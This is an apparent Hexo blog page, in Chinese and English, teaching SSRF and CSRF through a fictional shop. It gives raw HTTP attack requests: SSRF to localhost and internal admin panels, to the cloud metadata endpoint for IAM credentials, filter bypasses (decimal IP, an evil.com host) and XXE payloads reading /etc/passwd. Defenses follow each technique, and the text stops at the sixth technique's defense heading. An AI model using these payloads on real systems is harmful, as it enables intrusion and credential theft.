@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Server-Side Request Forgery (SSRF) | HackThe4O4</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Server-Side Request Forgery (SSRF) 與 Cross-Site Request Forgery (CSRF)：從入門到進階，涵蓋 OWASP Top 10 相關攻擊手法簡介 &#x2F; IntroductionServer-Side Request Forgery（SSRF，伺服器端請求偽造）和 Cross-Site Request Forgery（CSRF，跨站">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Server-Side Request Forgery (SSRF)">
+<meta property="og:url" content="https://no-flag.com/2025/05/07/Server-SideRequestForgery/index.html">
+<meta property="og:site_name" content="HackThe4O4">
+<meta property="og:description" content="Server-Side Request Forgery (SSRF) 與 Cross-Site Request Forgery (CSRF)：從入門到進階，涵蓋 OWASP Top 10 相關攻擊手法簡介 &#x2F; IntroductionServer-Side Request Forgery（SSRF，伺服器端請求偽造）和 Cross-Site Request Forgery（CSRF，跨站">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-05-06T17:47:32.932Z">
+<meta property="article:modified_time" content="2025-05-06T17:48:29.414Z">
+<meta property="article:author" content="Noflag">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="HackThe4O4" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/cat.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="/img/mela.gif" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/2024/12/21/hello-world/">About Me</a></li>
+				        
+							<li><a href="/archives">All articles</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="/img/mela.gif" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/2024/12/21/hello-world/">About Me</a></li>
+		        
+					<li><a href="/archives">All articles</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="Server-Side Request Forgery (SSRF)-Server-SideRequestForgery" class="article article-type-Server-Side Request Forgery (SSRF)" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/05/07/Server-SideRequestForgery/" class="article-date">
+  	<time datetime="2025-05-06T17:47:32.932Z" itemprop="datePublished">2025-05-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Server-Side Request Forgery (SSRF)
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Server-Side-Request-Forgery-SSRF-與-Cross-Site-Request-Forgery-CSRF-：從入門到進階，涵蓋-OWASP-Top-10-相關攻擊手法"><a href="#Server-Side-Request-Forgery-SSRF-與-Cross-Site-Request-Forgery-CSRF-：從入門到進階，涵蓋-OWASP-Top-10-相關攻擊手法" class="headerlink" title="Server-Side Request Forgery (SSRF) 與 Cross-Site Request Forgery (CSRF)：從入門到進階，涵蓋 OWASP Top 10 相關攻擊手法"></a>Server-Side Request Forgery (SSRF) 與 Cross-Site Request Forgery (CSRF)：從入門到進階，涵蓋 OWASP Top 10 相關攻擊手法</h1><h2 id="簡介-Introduction"><a href="#簡介-Introduction" class="headerlink" title="簡介 &#x2F; Introduction"></a>簡介 &#x2F; Introduction</h2><p><strong>Server-Side Request Forgery</strong>（<strong>SSRF</strong>，伺服器端請求偽造）和 <strong>Cross-Site Request Forgery</strong>（<strong>CSRF</strong>，跨站請求偽造）是兩種常見的網頁安全漏洞，均屬於 <strong>OWASP Top 10</strong> 關注的風險範疇。它們允許攻擊者誘導應用程式執行未授權的 <strong>HTTP requests</strong>（HTTP 請求），可能導致 <strong>data leakage</strong>（資料洩露）、<strong>privilege escalation</strong>（權限提升）或 <strong>remote code execution</strong>（遠程程式碼執行）。雖然 <strong>SSRF</strong> 和 <strong>CSRF</strong> 名稱相似，但它們的運作機制、攻擊目標和防禦策略截然不同。</p>
+<p><strong>中文解釋</strong>：<br>想像你的網頁應用程式是一間銀行，<strong>SSRF</strong> 是壞人騙銀行內部員工（伺服器）去拿機密文件（內部資源）；<strong>CSRF</strong> 是壞人騙你（已登入的用戶）在不知情下簽署一張轉帳單（執行操作）。這兩種攻擊都很危險，但方式不同。</p>
+<p>本文將深入探討 <strong>SSRF</strong> 和 <strong>CSRF</strong>，針對新手詳細解釋每個專業術語，並以一家虛擬電商平台（ShopEasy）為統一情境，展示所有與 <strong>OWASP Top 10</strong> 相關的攻擊手法。我們將涵蓋基礎知識、攻擊技術、防禦策略，並明確區分 <strong>SSRF</strong> 與 <strong>CSRF</strong> 的差異。文章以 <strong>Markdown</strong> 格式撰寫，中文部分使用繁體中文，參考但不直接複製提供的資料，確保內容深入且易懂。</p>
+<hr>
+<h2 id="SSRF-與-CSRF-的基礎-Basics-of-SSRF-and-CSRF"><a href="#SSRF-與-CSRF-的基礎-Basics-of-SSRF-and-CSRF" class="headerlink" title="SSRF 與 CSRF 的基礎 &#x2F; Basics of SSRF and CSRF"></a>SSRF 與 CSRF 的基礎 &#x2F; Basics of SSRF and CSRF</h2><h3 id="什麼是-SSRF？-What-is-Server-Side-Request-Forgery"><a href="#什麼是-SSRF？-What-is-Server-Side-Request-Forgery" class="headerlink" title="什麼是 SSRF？ &#x2F; What is Server-Side Request Forgery?"></a>什麼是 SSRF？ &#x2F; What is Server-Side Request Forgery?</h3><p><strong>Server-Side Request Forgery</strong>（<strong>SSRF</strong>）是一種安全漏洞，允許攻擊者誘導伺服器端應用程式向非預期的目標發送 <strong>HTTP requests</strong>（HTTP 請求）。這些目標可能是：</p>
+<ul>
+<li>組織內部的 <strong>internal services</strong>（內部服務），如管理介面或資料庫。</li>
+<li>外部的任意系統，可能洩露敏感資料或觸發惡意操作。</li>
+</ul>
+<p><strong>原理</strong>：<br><strong>SSRF</strong> 利用應用程式對用戶輸入（如 <strong>URLs</strong>）的信任，誘導伺服器發送請求。攻擊者通常通過操控 <strong>request parameters</strong>（請求參數）或 <strong>headers</strong>（標頭）來指定目標 <strong>URL</strong>。</p>
+<p><strong>中文解釋</strong>：<br><strong>SSRF</strong> 就像壞人騙銀行的內部員工（伺服器）去檔案室拿機密文件（內部資源），或去壞人的網站偷資料。伺服器以為這是正常工作，但其實被利用了。</p>
+<h3 id="什麼是-CSRF？-What-is-Cross-Site-Request-Forgery"><a href="#什麼是-CSRF？-What-is-Cross-Site-Request-Forgery" class="headerlink" title="什麼是 CSRF？ &#x2F; What is Cross-Site Request Forgery?"></a>什麼是 CSRF？ &#x2F; What is Cross-Site Request Forgery?</h3><p><strong>Cross-Site Request Forgery</strong>（<strong>CSRF</strong>）是一種攻擊，誘導已通過身份驗證的用戶在不知情的情況下，向應用程式發送惡意的 <strong>HTTP requests</strong>（HTTP 請求）。這些請求通常執行敏感操作，如更改密碼或轉帳。</p>
+<p><strong>原理</strong>：<br><strong>CSRF</strong> 利用瀏覽器的 <strong>session cookies</strong>（會話 cookie），當用戶訪問惡意網站時，瀏覽器自動附加 <strong>cookies</strong>，使請求看似合法。攻擊者通過 <strong>HTML forms</strong>（表單）或 <strong>JavaScript</strong> 觸發請求。</p>
+<p><strong>中文解釋</strong>：<br><strong>CSRF</strong> 就像壞人寄給你一封假郵件，騙你點擊一個按鈕，結果你的銀行帳戶自動轉帳，因為你已經登入了銀行網站，瀏覽器以為這是你自己的操作。</p>
+<h3 id="SSRF-與-CSRF-的核心區別-Key-Differences-Between-SSRF-and-CSRF"><a href="#SSRF-與-CSRF-的核心區別-Key-Differences-Between-SSRF-and-CSRF" class="headerlink" title="SSRF 與 CSRF 的核心區別 &#x2F; Key Differences Between SSRF and CSRF"></a>SSRF 與 CSRF 的核心區別 &#x2F; Key Differences Between SSRF and CSRF</h3><table>
+<thead>
+<tr>
+<th>特性</th>
+<th><strong>SSRF</strong></th>
+<th><strong>CSRF</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>攻擊目標</strong></td>
+<td>伺服器端應用程式，誘導發送 <strong>HTTP requests</strong> 到非預期目標</td>
+<td>已登入的用戶，誘導瀏覽器發送惡意 <strong>HTTP requests</strong></td>
+</tr>
+<tr>
+<td><strong>執行主體</strong></td>
+<td>伺服器（<strong>server-side</strong>）</td>
+<td>客戶端（<strong>client-side</strong>，用戶的瀏覽器）</td>
+</tr>
+<tr>
+<td><strong>依賴條件</strong></td>
+<td>用戶可控制的輸入（如 <strong>URLs</strong>）</td>
+<td>用戶已通過 <strong>authentication</strong>（身份驗證）</td>
+</tr>
+<tr>
+<td><strong>常見影響</strong></td>
+<td><strong>Data leakage</strong>（資料洩露）、<strong>internal network reconnaissance</strong>（內網偵察）、<strong>remote code execution</strong></td>
+<td><strong>Unauthorized actions</strong>（未授權操作，如轉帳、更改資料）</td>
+</tr>
+<tr>
+<td><strong>防禦重點</strong></td>
+<td>驗證和限制伺服器端 <strong>URLs</strong></td>
+<td>使用 <strong>CSRF tokens</strong>（CSRF 令牌）防止未授權請求</td>
+</tr>
+</tbody></table>
+<p><strong>中文解釋</strong>：<br><strong>SSRF</strong> 是騙銀行的電腦（伺服器）去幹壞事；<strong>CSRF</strong> 是騙你的瀏覽器（客戶端）幫壞人做事。<strong>SSRF</strong> 更像內部入侵，<strong>CSRF</strong> 像假冒你的身份。</p>
+<hr>
+<h2 id="統一情境：ShopEasy-電商平台-Unified-Scenario-ShopEasy-E-Commerce-Platform"><a href="#統一情境：ShopEasy-電商平台-Unified-Scenario-ShopEasy-E-Commerce-Platform" class="headerlink" title="統一情境：ShopEasy 電商平台 &#x2F; Unified Scenario: ShopEasy E-Commerce Platform"></a>統一情境：ShopEasy 電商平台 &#x2F; Unified Scenario: ShopEasy E-Commerce Platform</h2><p>我們設定一個情境：ShopEasy 是一家線上購物平台，允許用戶瀏覽商品、購買產品、管理帳戶和查看庫存。平台使用 <strong>RESTful API</strong> 提供功能，資料以 <strong>JSON</strong> 格式傳輸。功能包括：</p>
+<ul>
+<li><strong>Product Catalog</strong>（產品目錄）：顯示商品資訊和庫存狀態。</li>
+<li><strong>User Account</strong>（用戶帳戶）：管理個人資料、訂單和密碼。</li>
+<li><strong>Stock Check API</strong>（庫存檢查 API）：查詢商品在特定商店的庫存。</li>
+<li><strong>Admin Panel</strong>（管理面板）：管理員可管理商品和用戶。</li>
+</ul>
+<p><strong>漏洞</strong>：</p>
+<ul>
+<li><strong>Stock Check API</strong> 接受用戶提供的 <strong>URLs</strong>，未嚴格驗證。</li>
+<li><strong>CSRF</strong> 防護不足，敏感操作缺乏 <strong>CSRF tokens</strong>。</li>
+<li>內部系統（如管理介面）使用私有 IP（如 <code>192.168.0.1</code>），可通過 <strong>SSRF</strong> 訪問。</li>
+<li><strong>API documentation</strong> 公開，暴露隱藏端點。</li>
+</ul>
+<p>以下將以 ShopEasy 為例，展示所有與 <strong>OWASP Top 10</strong> 相關的 <strong>SSRF</strong> 和 <strong>CSRF</strong> 攻擊手法。</p>
+<hr>
+<h2 id="OWASP-Top-10-相關攻擊手法-Attack-Techniques-Related-to-OWASP-Top-10"><a href="#OWASP-Top-10-相關攻擊手法-Attack-Techniques-Related-to-OWASP-Top-10" class="headerlink" title="OWASP Top 10 相關攻擊手法 &#x2F; Attack Techniques Related to OWASP Top 10"></a>OWASP Top 10 相關攻擊手法 &#x2F; Attack Techniques Related to OWASP Top 10</h2><p><strong>OWASP Top 10</strong> 涵蓋了網頁應用程式的主要安全風險，<strong>SSRF</strong> 和 <strong>CSRF</strong> 與多個風險相關（如 <strong>Security Misconfiguration</strong>、<strong>Broken Access Control</strong>）。以下詳細介紹 <strong>SSRF</strong> 和 <strong>CSRF</strong> 的攻擊手法，涵蓋所有可能的利用方式。</p>
+<h3 id="攻擊手法-1：SSRF-攻擊本地伺服器-SSRF-Attacks-Against-the-Local-Server"><a href="#攻擊手法-1：SSRF-攻擊本地伺服器-SSRF-Attacks-Against-the-Local-Server" class="headerlink" title="攻擊手法 1：SSRF 攻擊本地伺服器 &#x2F; SSRF Attacks Against the Local Server"></a>攻擊手法 1：SSRF 攻擊本地伺服器 &#x2F; SSRF Attacks Against the Local Server</h3><p><strong>定義</strong>：<br>攻擊者誘導應用程式向本地伺服器發送 <strong>HTTP requests</strong>，通常使用 <strong>loopback addresses</strong>（回環地址，如 <code>127.0.0.1</code> 或 <code>localhost</code>），繞過 <strong>access controls</strong>（存取控制）。</p>
+<p><strong>原理</strong>：<br>應用程式可能對來自本地的請求給予更高信任，允許訪問敏感功能（如管理介面）。攻擊者通過操控 <strong>URL</strong> 參數，誘導伺服器訪問本地資源。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者利用 <strong>Stock Check API</strong> 訪問本地管理介面。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>訪問管理介面</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://localhost:8080/admin</span><br></pre></td></tr></table></figure>
+<ul>
+<li>伺服器訪問 <code>http://localhost:8080/admin</code>，返回管理介面內容。</li>
+</ul>
+</li>
+<li><p><strong>繞過認證</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://127.0.0.1:8080/admin/users</span><br></pre></td></tr></table></figure>
+<ul>
+<li>由於請求來自本地，伺服器繞過 <strong>authentication</strong>，洩露用戶資料。</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這就像騙銀行的電腦去自己的機密檔案室（<code>localhost</code>）拿資料，因為電腦以為這是內部請求，就沒檢查身份。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>禁止 <strong>loopback addresses</strong>（如 <code>127.0.0.1</code>、<code>localhost</code>）作為 <strong>URL</strong> 輸入。</li>
+<li>對所有請求實施一致的 <strong>access controls</strong>。</li>
+<li>使用 <strong>network segmentation</strong>（網路分段）隔離敏感服務。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-2：SSRF-攻擊內部後端系統-SSRF-Attacks-Against-Internal-Back-End-Systems"><a href="#攻擊手法-2：SSRF-攻擊內部後端系統-SSRF-Attacks-Against-Internal-Back-End-Systems" class="headerlink" title="攻擊手法 2：SSRF 攻擊內部後端系統 &#x2F; SSRF Attacks Against Internal Back-End Systems"></a>攻擊手法 2：SSRF 攻擊內部後端系統 &#x2F; SSRF Attacks Against Internal Back-End Systems</h3><p><strong>定義</strong>：<br>攻擊者誘導伺服器向內部 <strong>non-routable</strong>（不可路由）系統發送 <strong>HTTP requests</strong>，存取通常無法直接訪問的資源。</p>
+<p><strong>原理</strong>：<br>內部系統（如資料庫、管理介面）使用私有 IP（如 <code>192.168.0.1</code>），通常缺乏嚴格的 <strong>authentication</strong>。<strong>SSRF</strong> 允許攻擊者通過伺服器作為代理訪問這些系統。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者利用 <strong>Stock Check API</strong> 訪問內部管理伺服器。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>內部管理介面</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://192.168.0.68:8080/admin</span><br></pre></td></tr></table></figure>
+<ul>
+<li>伺服器訪問內部管理介面，洩露敏感資料。</li>
+</ul>
+</li>
+<li><p><strong>雲端元資料</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://169.254.169.254/latest/meta-data/</span><br></pre></td></tr></table></figure>
+<ul>
+<li>獲取 AWS 雲端伺服器的 <strong>instance metadata</strong>（實例元資料），包括 <strong>IAM credentials</strong>（身份憑證）。</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這就像騙銀行的電腦去地下室的秘密伺服器（內部系統）偷資料，因為地下室沒鎖，壞人輕鬆得手。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>禁止私有 IP 範圍（如 <code>192.168.0.0/16</code>、<code>10.0.0.0/8</code>）作為 <strong>URL</strong> 輸入。</li>
+<li>在內部系統上實施 <strong>authentication</strong> 和 <strong>access controls</strong>。</li>
+<li>使用 <strong>firewall</strong>（防火牆）限制伺服器對內網的訪問。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-3：Blind-SSRF（盲-SSRF）"><a href="#攻擊手法-3：Blind-SSRF（盲-SSRF）" class="headerlink" title="攻擊手法 3：Blind SSRF（盲 SSRF）"></a>攻擊手法 3：Blind SSRF（盲 SSRF）</h3><p><strong>定義</strong>：<br><strong>Blind SSRF</strong> 是指攻擊者可誘導伺服器發送 <strong>HTTP requests</strong>，但無法直接看到回應內容，屬於 <strong>out-of-band</strong>（頻外）攻擊。</p>
+<p><strong>原理</strong>：<br>攻擊者通過 <strong>DNS lookups</strong>（DNS 查詢）或 <strong>network interactions</strong>（網路互動）確認漏洞存在，並可能利用 <strong>client-side vulnerabilities</strong>（客戶端漏洞）或 <strong>server-side vulnerabilities</strong>（伺服器端漏洞）進一步攻擊。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者使用 <strong>Burp Collaborator</strong> 檢測 <strong>Blind SSRF</strong>，並嘗試觸發其他漏洞。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>檢測 Blind SSRF</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://xyz.burpcollaborator.net</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Burp Collaborator</strong> 記錄 <strong>DNS lookup</strong> 或 <strong>HTTP request</strong>，證明存在 <strong>Blind SSRF</strong>。</li>
+</ul>
+</li>
+<li><p><strong>利用 Shellshock</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://192.168.0.68/cgi-bin/status.sh</span><br></pre></td></tr></table></figure>
+<ul>
+<li>內部系統運行未修補的 <strong>Shellshock</strong> 漏洞，執行任意命令。</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這就像壞人讓銀行的電腦打電話給壞人的號碼（<strong>Burp Collaborator</strong>），雖然看不到回話內容，但知道電話打通了，然後利用漏洞搞亂系統。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>使用 <strong>outbound firewall</strong>（出站防火牆）限制未知 <strong>DNS</strong> 和 <strong>HTTP</strong> 請求。</li>
+<li>定期修補內部系統的已知漏洞（如 <strong>Shellshock</strong>）。</li>
+<li>監控異常的 <strong>network traffic</strong>（網路流量）。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-4：SSRF-繞過過濾器-Bypassing-SSRF-Filters"><a href="#攻擊手法-4：SSRF-繞過過濾器-Bypassing-SSRF-Filters" class="headerlink" title="攻擊手法 4：SSRF 繞過過濾器 &#x2F; Bypassing SSRF Filters"></a>攻擊手法 4：SSRF 繞過過濾器 &#x2F; Bypassing SSRF Filters</h3><p><strong>定義</strong>：<br>攻擊者使用技術繞過 <strong>blacklist</strong>（黑名單）或 <strong>whitelist</strong>（白名單）過濾器，誘導伺服器訪問受限 <strong>URLs</strong>。</p>
+<p><strong>原理</strong>：<br>應用程式可能對 <strong>URLs</strong> 實施過濾（如禁止 <code>localhost</code>），但攻擊者可通過 <strong>URL encoding</strong>（URL 編碼）、<strong>alternative IP representations</strong>（替代 IP 表示）或 <strong>open redirection</strong>（開放重定向）繞過。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者使用各種 <strong>payloads</strong> 繞過 <strong>Stock Check API</strong> 的 <strong>URL</strong> 過濾。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>Blacklist 繞過</strong>：  </p>
+<ul>
+<li>原始過濾器禁止 <code>127.0.0.1</code> 和 <code>localhost</code>。</li>
+<li>攻擊者發送：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://2130706433/admin</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>2130706433</code> 是 <code>127.0.0.1</code> 的十進位表示，繞過過濾。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>Whitelist 繞過</strong>：  </p>
+<ul>
+<li>過濾器僅允許 <code>shopeasy.com</code>。</li>
+<li>攻擊者發送：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=https://shopeasy.com@evil.com/admin</span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用 <code>@</code> 嵌入憑證，誘導訪問 <code>evil.com</code>。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>Open Redirection 繞過</strong>：  </p>
+<ul>
+<li>ShopEasy 存在 <strong>open redirection</strong> 漏洞：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /product/next?path=http://evil.com</span><br></pre></td></tr></table></figure></li>
+<li>攻擊者發送：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://shopeasy.com/product/next?path=http://192.168.0.68/admin</span><br></pre></td></tr></table></figure>
+<ul>
+<li>重定向到內部管理介面。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這就像壞人用化名（<code>2130706433</code>）或假地址（<code>shopeasy.com@evil.com</code>）騙過銀行的門禁，進到機密檔案室。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>使用嚴格的 <strong>URL parsing</strong>（URL 解析）庫，檢查完整 <strong>URL</strong>。</li>
+<li>禁止重定向到非預期 <strong>URLs</strong>。</li>
+<li>使用 <strong>whitelist</strong> 限制允許的域名，並驗證 <strong>DNS resolution</strong>（DNS 解析）。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-5：SSRF-通過-XML-External-Entity-XXE-SSRF-via-XML-External-Entity-XXE"><a href="#攻擊手法-5：SSRF-通過-XML-External-Entity-XXE-SSRF-via-XML-External-Entity-XXE" class="headerlink" title="攻擊手法 5：SSRF 通過 XML External Entity (XXE) &#x2F; SSRF via XML External Entity (XXE)"></a>攻擊手法 5：SSRF 通過 XML External Entity (XXE) &#x2F; SSRF via XML External Entity (XXE)</h3><p><strong>定義</strong>：<br>攻擊者利用 <strong>XML External Entity</strong>（<strong>XXE</strong>）漏洞，在 <strong>XML</strong> 資料解析時誘導伺服器發送 <strong>HTTP requests</strong>，實現 <strong>SSRF</strong>。</p>
+<p><strong>原理</strong>：<br><strong>XXE</strong> 允許攻擊者在 <strong>XML</strong> 中定義外部實體（如 <strong>URLs</strong>），伺服器解析時會訪問這些 <strong>URLs</strong>，可能導致 <strong>SSRF</strong>。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者上傳惡意 <strong>XML</strong> 檔案，誘導伺服器訪問內部系統。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>內部系統訪問</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/upload/xml HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [&lt;!ENTITY xxe SYSTEM &quot;http://192.168.0.68/admin&quot;&gt;]&gt;</span><br><span class="line">&lt;data&gt;&amp;xxe;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>伺服器解析 <strong>XML</strong>，訪問內部管理介面。</li>
+</ul>
+</li>
+<li><p><strong>資料洩露</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/upload/xml HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;data&gt;&amp;xxe;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>伺服器返回 <code>/etc/passwd</code> 內容，結合 <strong>SSRF</strong> 洩露資料。</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這就像壞人在上傳的檔案（<strong>XML</strong>）裡藏了一個命令，騙銀行的電腦去拿機密資料或內部文件。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>禁用 <strong>XML</strong> 外部實體解析（設置 <code>disable_entity_loader</code> 或禁用 <code>resolveExternals</code>）。</li>
+<li>使用 <strong>JSON</strong> 或其他安全的資料格式。</li>
+<li>驗證和清理上傳的 <strong>XML</strong> 內容。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-6：SSRF-通過-Referer-Header-SSRF-via-Referer-Header"><a href="#攻擊手法-6：SSRF-通過-Referer-Header-SSRF-via-Referer-Header" class="headerlink" title="攻擊手法 6：SSRF 通過 Referer Header &#x2F; SSRF via Referer Header"></a>攻擊手法 6：SSRF 通過 Referer Header &#x2F; SSRF via Referer Header</h3><p><strong>定義</strong>：<br>攻擊者通過操控 <strong>Referer header</strong>（參考來源標頭），誘導伺服器端的分析軟體訪問惡意 <strong>URLs</strong>，實現 <strong>SSRF</strong>。</p>
+<p><strong>原理</strong>：<br>某些應用程式使用分析軟體記錄 <strong>Referer header</strong>，並訪問其中的 <strong>URLs</strong>（如檢查來源網站）。攻擊者可注入惡意 <strong>URLs</strong>。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者通過 <strong>Referer header</strong> 誘導伺服器訪問內部系統。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>內部系統訪問</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /product/123 HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Referer: http://192.168.0.68/admin</span><br></pre></td></tr></table></figure>
+<ul>
+<li>分析軟體訪問內部管理介面，洩露資料。</li>
+</ul>
+</li>
+<li><p><strong>Blind SSRF 檢測</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /product/123 HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Referer: http://xyz.burpcollaborator.net</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Burp Collaborator</strong> 記錄互動，證明漏洞。</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這就像壞人在銀行的訪客紀錄（<strong>Referer header</strong>）寫上假地址，騙銀行的電腦去那個地址拿資料。</p>
+<p><strong>防禦</strong>：  </p>
